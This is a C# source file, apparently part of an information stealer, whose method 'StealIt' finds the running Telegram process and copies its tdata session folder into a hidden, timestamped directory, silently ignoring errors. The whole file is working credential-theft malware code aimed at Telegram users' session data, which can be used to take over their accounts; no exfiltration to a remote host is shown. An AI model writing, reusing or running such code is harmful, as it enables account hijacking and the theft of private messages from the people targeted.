using System;
using System.Diagnostics;
using System.IO;

namespace I_See_you
{
    class Telegram
    {
        private static bool in_folder = false;
        public static void StealIt(string path)
        {
            var prcName = "Telegram";
            Process[] processByName = Process.GetProcessesByName(prcName);

            if (processByName.Length < 1)
                return;

            var dir_from = Path.GetDirectoryName(processByName[0].MainModule.FileName) + "\\Tdata";
            var dir_to = path + "\\Telegram_" +
                        (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds;
            CopyAll(dir_from, dir_to);
        }
        private static void CopyAll(string fromDir, string toDir)
        {
            DirectoryInfo di = Directory.CreateDirectory(toDir);
            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            foreach (string s1 in Directory.GetFiles(fromDir))
                CopyFile(s1, toDir);

            foreach (string s in Directory.GetDirectories(fromDir))
                CopyDir(s, toDir);
        }
        private static void CopyFile(string s1, string toDir)
        {
            try
            {
                var fname = Path.GetFileName(s1);

                if (in_folder && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                    return;

                var s2 = toDir + "\\" + fname;

                File.Copy(s1, s2);
            }
            catch { }
        }

        private static void CopyDir(string s, string toDir)
        {
            try
            {
                in_folder = true;
                CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                in_folder = false;
            }
            catch { }
        }
    }
 
}

